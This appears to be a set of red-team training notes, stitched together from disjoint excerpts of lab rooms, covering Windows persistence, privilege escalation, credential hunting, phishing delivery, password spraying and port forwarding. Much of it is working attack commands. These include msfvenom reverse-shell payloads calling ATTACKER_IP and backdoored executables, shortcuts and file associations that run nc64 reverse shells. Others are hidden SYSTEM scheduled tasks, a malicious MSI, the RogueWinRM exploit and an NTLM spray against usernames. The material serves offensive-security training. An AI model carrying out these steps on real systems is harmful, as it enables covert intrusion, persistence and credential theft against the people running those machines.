Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. The most privileged groups or resources are not always the best choice, as they are often more closely watched for changes by the blue team. Exploiting permission delegation gave privileges to reset user passwords, which would be good for maintaining access to workstations.

    "c": "Credential access  Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs. Credentials are stored insecurely in various locations in systems: Unsecured Credentials: Credentials In Files - search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. Database files Memory Password managers Enterprise Vaults Active Directory Network Sniffing PowerShell history  As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt . It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, to look for the password keyword in the Window registry: c:\\Users\\user> reg query HKLM /f password /t REG_SZ /s OR C:\\Users\\user> reg query HKCU /f password /t REG_SZ /s Database Files  Applications use database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials. Configuration files contains a showcase example of extracting credentials from the local McAfee Endpoint database file. Password Managers  A password manager is an application to store and manage users’ login information for local and Internet websites and services. Since it deals with users’ data, it must be stored securely to prevent unauthorized access. Password Manager applications can be built-in (Windows) or third-party, like KeePass, 1Password, LastPass Misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools can be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications. Memory Dump  The Operating system’s memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system. The following are examples of memory stored sensitive data, including clear-text credentials, cached passwords, and AD Tickets. Active Directory  Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room. The following are some Active Directory misconfigurations that may leak users’ credentials: Users’ description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorised access. Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. NTDS: Contains AD users’ credentials, making it a target for attackers. AD Attacks: Misconfiguration makes AD vulnerable to various attacks. Network Sniffing  Gaining initial access to a target network enables attackers to attack local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes.

The net user command will be executed when the service is started, resetting the Administrator’s password to password . The service has been set to start automatically ( start= auto ), so that it runs without requiring user interaction. We can also create a reverse shell with msfvenom and associate it with the created service. Service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the exe-service format in msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe Copy the executable to the target system, say in C:\\Windows and point the service’s binPath to it: sc.exe create THMservice2 binPath= \"C:\\windows\\rev-svc.exe\" start= auto sc.exe start THMservice2 This creates a connection back to your attacker’s machine (if all went well).

    "t": "Backdooring files ",
    "c": "Backdooring files  Another method of establishing persistence tampers with files we know users interact with regularly. We can plant backdoors that will get executed whenever the user accesses them. We do not want to create any alerts that could blow our cover, so the files we alter must keep working for the user as expected. There are many ways and files to plant backdoors in. These are the most commonly used ones. Executable Files  Any executable lying around the desktop are highly likely used frequently. Suppose we find a shortcut to PuTTY . Checking the shortcut’s properties, it probably points to C:\\Program Files\\PuTTY\\putty.exe . We could download the executable to our attacker’s machine and modify it to run any payload we wanted. To create a backdoored putty.exe : msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b \"\\x00\" -f exe -o puttyX.exe The binary will still work as usual and will execute an additional payload silently by adding an extra thread in the binary. The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Shortcut files  If we don’t want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally. For example, if there is a calc shortcut, find where it is pointing to by right-clicking it and going to properties. Create a Powershell script in C:\\Windows\\System32 or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut’s properties: Start-Process -NoNewWindow \"c:\\tools\\nc64.exe\" \"-e cmd.exe ATTACKER_IP 4445\" C:\\Windows\\System32\\calc.exe Save it as backdoor.ps1 , or perhaps something less conspicuous Change the shortcut to point to the script. Its icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run the script in a hidden window, for which we add the -windowstyle hidden option to Powershell. Making the final target of the shortcut: powershell.exe -WindowStyle hidden C:\\Windows\\System32\\backdoor.ps1 Enter target for calc shortcut in its properties window, don't forget to change the icon Start a netcat listener to receive the reverse shell: nc -nlvp 4445 Try it out by double-clicking the shortcut, see that there is a connection back to the attack machine, and that the user will get a calculator just as expected. There may be a command prompt flashing up and disappearing immediately on the screen. A regular user might not mind too much about that, maybe. Hijacking file associations  We can also hijack any file association to force the operating system to run a shell whenever the user opens a specific file type. The default operating system file associations are kept inside the registry, where a key is stored for every single file type under HKLM\\Software\\Classes\\ . Check for the .fileextension subkey and find which Programmatic ID (ProgID) is associated with it. Then search for a subkey for the corresponding ProgID (also under HKLM\\Software\\Classes\\ ), which will give a reference to the program in charge of handling its type of files. Most ProgID entries will have a subkey under shell\\open\\command where the default command to be run for files with that extension is specified. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. Powershell script, for example for notepad ( .txt extensions): Start-Process -NoNewWindow \"c:\\tools\\nc64.exe\" \"-e cmd.exe ATTACKER_IP 4448\" C:\\Windows\\system32\\NOTEPAD.EXE $args[0] Note: we have to pass $args[0] to notepad, as it will contain the name of the file to be opened, as given through %1 . Change the registry key to run our backdoor script in a hidden window (Data section), create a listener for the reverse shell and try to open any .txt file on the target machine.",

Victims are then prompted to enter personal information ranging from login names and passwords to social security numbers, birthdates, account numbers, and other highly sensitive data. Email phishing is popular because of the easy access to databases containing millions of active email addresses, providing potential victims with relatively little risk and almost no cost. Spear phishing  Spear phishing refers to a phishing attack that targets a specific person. In so-called spear phishing an adversary creates an email message that appears to be from a trusted sender, the tone of the email way more informal than in a phishing attack, and usually contains some sort of emergency with a request for help, in such a way that a quick, instinctive action is required to help the other (before thinking can intervene). With personal information shared on social networking sites (first and last name, names of family members, and employers), spear-phishing is easier than ever. Smishing  Short message service (SMS) phishing, also known as smishing, is a phishing attack conducted through text messaging instead of email. Vishing  Vishing refers to phishing attacks that use voice over the phone instead of email. Whaling  Whaling refers to a phishing attack that targets the “big fish” of a company, such as the CEO. The victim is researched more thoroughly with reconnaissance and lured with a fake document from, for example, the tax office, and state that the opening of the document requires the installation of some “security software”, or something similar.",

    "t": "Logon triggered persistence ",
    "c": "Logon triggered persistence  Windows operating systems present several ways to link payloads with particular interactions. Startup folder  Every user has a Startup folder: C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup where each user can put executables to be run whenever they log in. Each user will only run whatever is available in their folder. An attacker can achieve persistence just by dropping a payload in there. If we want to force all users to run a payload while logging in, we can use the folder: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp Generate a reverse shell payload using msfvenom : msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe Copy the payload into the target machine by spawning an http.server with Python and using wget on the target machine to download the file. Start listener on port 4450. Store it in the C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp folder to get a shell back for any user logging into the machine: copy revshell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\" Sign out of the session from the start menu (closing an RDP window is not enough as it leaves the session open), and log back in via RDP to receive a connection back to the attack machine. Run/RunOnce  Instead of delivering a payload into a specific directory, you can also use the following registry entries to specify applications to run at logon: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce The registry entries under HKCU will only apply to the current user, and those under HKLM will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time. Create a reverse shell with msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe After transferring it to the victim machine, move it to C:\\Windows\\ : move revshell.exe C:\\Windows Create a REG_EXPAND_SZ registry entry under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run . The entry’s name can be anything, and the value is the command we want to execute. Start a listener, sign out of the current session and log in again, and you should receive a shell. Winlogon  Another alternative to automatically start programs on logon is abusing Winlogon , the Windows component that loads a user’s profile right after authentication (amongst other things). Winlogon uses some registry keys under HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ that can be used to gain persistence: Userinit points to userinit.exe , which is in charge of restoring your user profile preferences. shell points to the system’s shell, which is usually explorer.exe . Replacing any of the executables with a reverse shell break sthe logon sequence, but you can append commands separated by a comma, and Winlogon will process them all. Logon scripts  One of the things userinit.exe does while loading a user profile is to check for an environment variable called UserInitMprLogonScript . We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable is not set by default, so we can just create it and assign any script we like. Create a reverse shell, put it anywhere, create an environment variable for a user, go to its HKCU\\Environment in the registry. Use the UserInitMprLogonScript entry to point to the payload for it to get loaded when the user logs in. Set up a listener, sign out of the current session and log in again.",

Run the installer with the command below and receive the reverse shell: C:\\> msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi Notes  These belong more to the realm of CTF events rather than real world scenarios. Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it’s using a binary you can modify. Windows installer files ( .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. And they can be configured to run with higher privileges from any user account (even unprivileged ones).

It is run with SYSTEM privileges, so we can gain SYSTEM privileges by replacing the original binary with any payload. Because we can take ownership of any file, replacing it is trivial. Take ownership of utilman.exe : C:\\> takeown /f C:\\Windows\\System32\\Utilman.exe SUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\".

To trigger utilman, lock the screen from the start button, then click on the “Ease of Access” button, which runs utilman.exe with SYSTEM privileges. C:\\Windows\\system32> whoami nt authority\\system FTP impersonation  An FTP service running with user ftp . Without impersonation, if a user logs into the FTP server and tries to access ftp files, the FTP service would try to access them with its access token rather than Ann’s. With ftp token like this, we must manually configure specific permissions for each served file/directory. The ftp user has access to all files. If the FTP service were compromised at some point, the attacker would immediately gain access to all folders to which the ftp user has access. If instead, the FTP service’s user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf. If we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process. Plant a web shell on http://IP address target/ Use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest. Upload RogueWinRM to the target machine. The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, a port that exposes a Powershell console to be used remotely through the network. Start a netcat listener: # nc -lvp 4442 Use the web shell to trigger the RogueWinRM exploit: c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools\\nc64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\" The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. The exploit may take up to 2 minutes to work, so the browser may appear unresponsive for a bit. c:\\windows\\system32\\inetsrv>whoami nt authority\\system Notes  Privileges are rights that an account has to perform specific system-related tasks. These tasks can be from the privilege to shut down the machine up to privileges to bypass some DACL-based access controls. SeBackup/SeRestore  The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an adversary can trivially escalate privileges on the system by using many techniques. SeTakeOwnership  The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges. For example, search for a service running as SYSTEM and take ownership of the service’s executable. SeImpersonate/SeAssignPrimaryToken  These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user. Resources  Privilege Constants (Authorization) Priv2Admin",

DDoS attacks that target organisations for personal or political motives or to extort payment in exchange for ceasing the attack. Credential stuffing to gain access to accounts from data breaches to drain the associated accounts of stored values, credit card information, personally identifiable information and/or to use the account for impersonation, and for actions like sending spam. Targeted intrusions where typically small botnets compromise high-value systems of organisations from which attackers can penetrate and intrude further into the network. With just one zombie in an organisation, the adversary can now read email and monitor traffic and communications for sniffing out passwords, identifying databases, and looking for users with more administrative powers. The assets an adversary can look for include password databases, financial data, research and development, intellectual property, and customer information. Botnet infiltration works incredibly fast because most people will trust files that appear to have originated with other employees inside the network and will pass along files from sources they know.

Email delivery  Email delivery is a common method to send the payload by sending a phishing email with a link or attachment. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim’s network or host. Red teamers have their own infrastructure for phishing purposes . Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record. Red teamers can also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations. Another possibility would be to use a compromised email account within an organisation to send phishing emails within the organisation or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks. Web Delivery  Another method is hosting payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and a TLS (Transport Layer Security) certificate. This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener and other tricks could be helpful when using this method. In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine. USB Delivery  This method requires the victim to plug in the USB with payload physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. Organisations may have strong security policies such as disabling USB usage within the organisation environment. Not all do. Common USB attacks used to weaponise USB devices include Rubber Ducky and USBHarpoon, charging USB cable, such as O.MG Cable.",

The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. Create a task that runs a reverse shell every minute. In a real-world scenario, you will not want your payload to run that often, but we don’t want to wait too long for this exercise: schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr \"c:\\tools\\nc64 -e cmd.exe ATTACKER_IP 4449\" /ru SYSTEM SUCCESS: The scheduled task \"THM-TaskBackdoor\" has successfully been created. The /sc and /mo options indicate that the task should be run every single minute. The /ru option indicates that the task will run with SYSTEM privileges. Check with: schtasks /query /tn thm-taskbackdoor To hide the scheduled task, make it invisible to any user in the system by deleting its Security Descriptor (SD). The security descriptor is an ACL that states which users have access to the scheduled task. If a user is not allowed to query a scheduled task, it will not be visible, as Windows only shows the tasks that a user has permission to use. Deleting the SD is equivalent to disallowing all users’ access to the scheduled task, including Administrators. The security descriptors of all scheduled tasks are stored in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\ . There is a registry key for every task, under which a value named SD contains the security descriptor. You can only erase the value if you have SYSTEM privileges. Use psexec (available in C:\\tools ) to open Regedit with SYSTEM privileges: c:\\tools\\pstools\\PsExec64.exe -s -i regedit And delete the security descriptor for the task. Checking, the system reports there is no such task: schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.

LocalSystem is just the highest privileged account available. To trigger the payload, restart the service: C:\\> sc stop NamedService C:\\> sc start NamedService Notes  Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services. Use the sc qc someservice command for more info on a service. The associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter. Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. All services configurations are stored in the registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\\ A subkey exists for every service in the system. If a DACL has been configured for the service, it will be stored in a subkey called Security . Only administrators can modify such registry entries by default. Insecure Permissions on Service Executable  If an executable associated with a service has weak permissions that allow an adversary to modify or replace it, the adversary can gain the privileges of the service’s account. Unquoted path vulnerability  When we can’t directly write into service executables, there might still be a chance. Most of the service executables will be installed under C:\\Program Files or C:\\Program Files (x86) by default, which isn’t writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule. Some installers change the permissions on the installed folders, making the services vulnerable. An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, an “Unquoted Service Paths vulnerability” (if found) can be exploited. For example, the Administrator installed the Disk Sorter binaries under c:\\MyPrograms . By default, this inherits the permissions of the C:\\ directory, which allows any user to create files and folders in it. Check with icacls in the Command Prompt: C:\\>icacls c:\\MyPrograms c:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) BUILTIN\\Users:(I)(CI)(AD) BUILTIN\\Users:(I)(CI)(WD) CREATOR OWNER:(I)(OI)(CI)(IO)(F) The BUILTIN\\\\Users group has AD and WD privileges, allowing a user to create subdirectories and files. The Unquoted in “Unquoted Service Paths vulnerability” means that the path of the associated executable is not properly quoted to account for spaces on the command. Quoted: BINARY_PATH_NAME :...",

Credential spilling is when credentials gained from data breaches are sold to other adversaries. Credential stuffing is the large scale use of automated means to test stolen passwords against other unrelated websites. This is a possible and often successful attack because of the tendency for users to recycle their passwords for multiple accounts. Adversaries no longer need advanced technical skills, specialized equipment, or insider knowledge to successfully attack major websites. Tools are available that bypass traditional security controls, like IP rate limits, reputation lists, blacklists, and other forms of IP-based analysis. CAPTCHA and other controls designed to impede automated interaction with user interfaces are bypassed with Optical Character Recognition (OCR) software and other complementary mechanisms to read and solve those challenges the way that a human user would. A number of forums offer a wide variety of working configurations for various websites for the tools. Successful logins (usually 0.1-0.2%) allow the adversary to drain the associated accounts of stored values, credit card numbers, and other personally identifiable information and/or to use the account for impersonation, and for actions like sending spam.",

The techniques often involve content spamming, (all sorts of) link spamming, cloaking, doorway pages and redirection. These attacks often follow trending search terms. For example during natural disasters, when attackers attempt to have victims send monetary aid to fake accounts or during major political campaigns and other major world events. If its intent is malicious, the attacker aims to install malware such as trojans, attack the user’s machine, or trick the user into providing sensitive data (see attack tree). Exploiting typical web vulnerabilities on existing high-ranking web pages and using them to spread malware. If, for example, a high-ranking web page has a stored XSS vulnerability, the code may either directly attempt to spread malware or redirect the user to a different site (using redirection like used in black hat SEO). Any search engine software can expect the same search fraud problem as on the internet with similar impacts. Spam web pages will need to be weeded out from the index. Combating spam is intertwined with search engine poisoning as that attack uses SEO fraud techniques.",

Example: You use Nmap to discover live hosts on a target subnet and find open ports on live hosts. Moreover, you send various phishing emails leading the victim to a phishing webpage you’re hosting. Furthermore, you’re using the Metasploit framework to attempt to exploit certain software vulnerabilities. These are three separate activities, but if you use the same IP address(es) to carry out these different activities, this would lead to an OPSEC vulnerability. Example: An unsecured database that is used to store data received from phishing victims. If the database is not properly secured, it may lead to a malicious third party compromising the operation and could result in data being exfiltrated and used in an attack against the client’s network. Instead of helping the client secure their network, you end up helping a third party expose login names and passwords.",

You may intercept one or more of these hashes while pursuing other network attacks, for example, with Responder. Unlike password spraying, you do not risk account lockouts or alert triggers by cracking a hash offline. Hash functions  A cryptographic hash function is a type of algorithm that takes variable-length strings (message) of input and turns them into fixed-length hash values (message digest). The primary objective is message integrity, such that the hash value cannot be returned to its original string value. This makes hashing an ideal candidate for storing passwords. The hash-identifier Python script helps fingerprint various hash types by evaluating characteristics from the known hash value. Rainbow tables  A rainbow table computes the possible hash values for plaintext values, up to a certain length. Regardless of computing power, these tables can become massive and require enormous storage capacity (~300 GB). Each table is usually strategically designed for a specific hash requirement, such as MD5, SHA-1, and NT Lan Manager (NTLM), which is used in various Microsoft network protocols for authentication. Rainbow tables can be defeated by salted hashes, if the hashes are not salted however, and you have the correct table, a complex password can be cracked in a few minutes. There are various locations you can download Rainbow Tables, for example you can find a fairly comprehensive set of free Rainbow Tables at Project RainbowCrack including paid tables optimized for various things (NTLM, MD5, SHA1 etc). Project Shmoo is offering downloads of popular Rainbow Tables via BitTorrent. The tool to generate Rainbow Tables comes with the RainbowCrack download and is called rtgen . No resources  If you don’t have a high-performance computing system composed of graphics processing unit (GPU) clusters for Hashcat or RainbowCrack, using wordlists is a quick and dirty way to find out what you are working with in regard to overall security. You can also try a hash lookup service like Hashes.com. You can put in an MD5, SHA-1, Vbulletin, Invision Power Board, MyBB, Bcrypt, Wordpress, SHA-256, SHA-512, MYSQL5 etc. hash and search for its corresponding plaintext (“found”) in their database of already-cracked hashes.

    "c": "Password profiling  Having a good wordlist is critical to carrying out a successful password attack. Default passwords  Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers did not change the default password, making the system vulnerable. It is good practice to try out admin:admin , admin:password123 , … If we know the target device, service or software, we can look up the default passwords (if any) and try those. Some websites that provide default passwords for some products: CIRT.net Default Passwords DefaultPassword Datarecovery.com Default Passwords Weak Passwords  Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Some of those public common weak passwords lists: Skull security passwords - This includes the most well-known collections of passwords. SecLists - A huge collection of all kinds of lists, not only for password cracking. Leaked Passwords  Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as ‘dumps’. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. These are some common password lists that have weak and leaked passwords, including webhost, elitehacker, hak5, Hotmail, PhpBB companies’ leaks: SecLists/Passwords/Leaked-Databases Combined wordlists  Combine these wordlists into one large file with cat : cat file1.txt file2.txt file3.txt > combined_list.txt To clean up the generated combined list to remove duplicated words: sort combined_list.txt | uniq -u > cleaned_combined_list.txt Customized wordlists  Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a website contains valuable information about the organisation and its people, including emails and names. The website may contain keywords specific to what the organisation does or offers, including product and service names, which may be used in a password. Tools such as cewl can crawl a website and extract strings or keywords: cewl -w list.txt -d 5 -m 5 http://target.com -w will write the contents to a file (list.txt). -m 5 gathers strings (words) that are 5 characters or more -d 5 is the depth level of web crawling/spidering (default 2) The result is a decently sized wordlist based on relevant words for the specific organisation, like names, locations, and a lot of their lingo. The created wordlist can be used to fuzz for usernames. Username wordlists  With peoples’ names gathered during enumeration, we can generate username lists from the target’s website. For example, with a {first name} {last name} and a method of generating usernames: {first name}: john {last name}: smith {first name}{last name}: johnsmith {last name}{first name}: smithjohn first letter of the {first name}{last name}: jsmith first letter of the {last name}{first name}: sjohn first letter of the {first name}.{last name}: j.smith first letter of the {first name}-{last name}: j-smith ...

    "c": "NTLM authenticated services  New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users’ identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is used by the services on a network. And some services that use NetNTLM may also be exposed to the internet. Examples: Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal. Remote Desktop Protocol (RDP) service of a server being exposed to the internet. Exposed VPN endpoints that were integrated with AD. Web applications that are internet-facing and make use of NetNTLM. The user is now either granted access or denied access, authorisation is performed on the Exchange server with consultation of the msg.target.com Domain Controller. NTLM is generally considered insecure because it uses outdated cryptography that is vulnerable to several modes of attacks. NTLM is also vulnerable to pass-the-hash and brute-force attacks. Password spraying  Most AD environments have account lockout configured, we won’t be able to run a full brute-force attack. Instead, a password spraying attack might work. We could use tools such as Hydra to assist with the password spraying attack. The room uses a script named ntlm_passwordspray.py . The core function takes a suggested password and a URL to target as input and attempts to authenticate to the URL with each username in the textfile. By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not. If the credential pair is valid, the application responds with a 200 HTTP (OK) code. If the pair is invalid, the application returns a 401 HTTP (Unauthorised) code. The parameters: userfile - Textfile containing usernames ( usernames.txt ) fqdn - Fully qualified domain name associated with the organisation we are attacking ( za.tryhackme.com ) password - The password we want to use for our spraying attack ( Changeme123 ) attackurl - The URL of the application that supports Windows Authentication ( http://ntlmauth.za.tryhackme.com ) python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ Results: [*] Starting passwords spray attack using the following password: Changeme123 [-] Failed login with Username: anthony.reynolds [-] Failed login with Username: samantha.thompson [-] Failed login with Username: dawn.turner [-] Failed login with Username: frances.chapman [-] Failed login with Username: henry.taylor [-] Failed login with Username: jennifer.wood [+] Valid credential pair found!

    "t": "Port forwarding ",
    "c": "Port forwarding  SSH tunnelling  SSH, as it already has built-in functionality to do port forwarding through a feature called SSH Tunneling. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system. On Windows machines, most likely no SSH server will be available: Start a tunnel from the compromised machine, acting as an ssh client, to the attack machine, which will act as an ssh server. Making a connection back to our attacker’s machine, we will want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels. useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser The SSH tunnel can be used to do either local or remote port forwarding. SSH remote port forwarding  Remote port forwarding is useful, for example, when having gained control over the 2.2.2.2 Windows host (it does not need to be administrator access) and would like to use it as a pivot to access a port on a server to which we can not directly connect. Take a reachable port from the SSH client (the compromised machine) and project it into a remote ssh server (the attacker's machine). To forward port 3389 on the server back to our attacker’s machine, on the compromised Windows host: C:\\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N This establishes an SSH session from 2.2.2.2 (Compromised host) to 1.1.1.1 (Attacker machine) using the tunneluser user. Because the tunneluser is not allowed to run a shell on the attacker machine, we need to run the ssh command with the -N switch to prevent the client from requesting one, or the connection will exit immediately. The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the ssh server ( 3389 ), followed by a colon and then the IP and port of the socket we will be forwarding ( 3.3.3.3:3389 ). Port numbers do not need to match. When up and running, we can go to the attacker’s machine and RDP into the forwarded port to reach the server: xfreerdp /v:127.0.0.1 /u:<username> /p:<password> SSH local port forwarding  Local port forwarding allows for “pulling” a port from an ssh server into the ssh client. Any host on the network that can not connect directly to the attacker machine but can connect to the compromised host will now be able to reach the services offered on the attack machine through the pivot host. Take any service available in our attacker's machine and make it available through a port on the compromised host. To forward port 80 from the attack machine and make it available from the compromised host, run: C:\\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N The -L option requires indicating which local socket used by the compromised host to receive connections on ( *:80 ) and the remote socket to connect to from the attack machine perspective ( 127.0.0.1:80 ). Opening a new port on the compromised host, add a firewall rule to allow for incoming connections (with dir=in ). This requires administrative privileges: netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80 Up and running, any user pointing their browsers to the compromised host at http://2.2.2.2:80 will see the website published by the attack machine. Port forwarding with socat  socat is not as flexible as ssh , and it is more noisy, but if ssh is not available on the compromised host, may be an option. It must be transferred to the compromised host first. Access port 3389 on the server using the compromised host as a pivot, with a similar effect as SSH remote port forwarding. To access port 3389 on the server using the compromised host: C:\\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 The fork option forks a new process for each connection received, making multiple connections without closing possible. Otherwise, it would be closed after the first connection finishes. And because a port is being opened on the pivot host, create a firewall rule: netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 The compromised host will spawn port 80 and listen for connections to be forwarded to port 80 on the attack machine. To expose port 80 from the attack machine, making it reachable by the server: C:\\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 Dynamic port forwarding and SOCKS  When wanting to run scans against many ports of a host, or even many ports across many machines through a pivot host, dynamic port forwarding seems a good choice. It allows for pivoting through a host and establishing several connections to any IP addresses/ports we want, by using a SOCKS proxy. Establish a reverse dynamic port forwarding ssh tunnel on the compromised host: C:\\> ssh tunneluser@1.1.1.1 -R 9050 -N Edit the proxychains configuration on the attack machine: sudo nano /etc/proxychains4.conf Go down to the [ProxyList] section and add your proxy connection. The default port is 9050 , but any port will work as long as it matches the one we used when establishing the SSH tunnel. If we now want to execute any command through the proxy, we can use proxychains , for example: proxychains curl http://pxeboot.za.tryhackme.com Note: nmap might not work well with SOCKS in some circumstances Flags  Connect to THMJMP2 via SSH using the credentials from the first task.

